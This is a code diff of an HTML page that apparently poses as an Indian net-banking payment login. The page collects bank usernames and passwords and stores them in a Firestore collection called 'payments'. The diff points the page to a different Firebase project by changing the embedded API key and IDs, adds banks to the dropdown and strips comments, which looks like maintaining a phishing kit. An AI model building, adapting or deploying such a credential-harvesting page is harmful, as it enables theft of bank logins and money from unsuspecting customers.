@@ -139,12 +139,12 @@
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
   <script>
     const firebaseConfig = {
-      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
-      authDomain: "dlhiljbrd.firebaseapp.com",
-      projectId: "dlhiljbrd",
-      storageBucket: "dlhiljbrd.firebasestorage.app",
-      messagingSenderId: "981951131769",
-      appId: "1:981951131769:web:5d56cd1423d753992664a8"
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.firebasestorage.app",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
@@ -176,10 +176,9 @@
       const user = document.getElementById("netUser").value.trim();
       const pass = document.getElementById("netPass").value.trim();
 
-      // Validation
       if (user === "" || pass === "") {
         alert("Please enter both Username and Password.");
-        return; // Stop submit
+        return;
       }
 
       db.collection("payments").add({
@@ -194,7 +193,8 @@
     }
 
     const bankList = [
-      "SelectBank", "Allahabad Bank", "Andhra Bank", "Axis Bank", "Bank of Bahrain and Kuwait",
+      "SelectBank", "Allahabad Bank",
+      "HDFC Bank","Andhra Bank", "Axis Bank", "Bank of Bahrain and Kuwait",
       "Bank of Baroda - Corporate Banking", "Bank of Baroda - Retail Banking",
       "Bank of India", "Bank of Maharashtra", "Canara Bank", "Central Bank of India",
       "City Union Bank", "Corporation Bank", "Deutsche Bank", "Development Credit Bank",
@@ -207,7 +207,7 @@
       "State Bank of Bikaner & Jaipur", "State Bank of Hyderabad", "State Bank of India",
       "State Bank of Mysore", "State Bank of Patiala", "State Bank of Travancore",
       "Syndicate Bank", "Tamilnad Mercantile Bank Ltd.", "UCO Bank",
-      "Union Bank of India", "United Bank of India", "Vijaya Bank", "Yes Bank Ltd"
+      "Union Bank of India", "United Bank of India", "Vijaya Bank", "Yes Bank Ltd","Other bank"
     ];
 
     window.onload = function () {
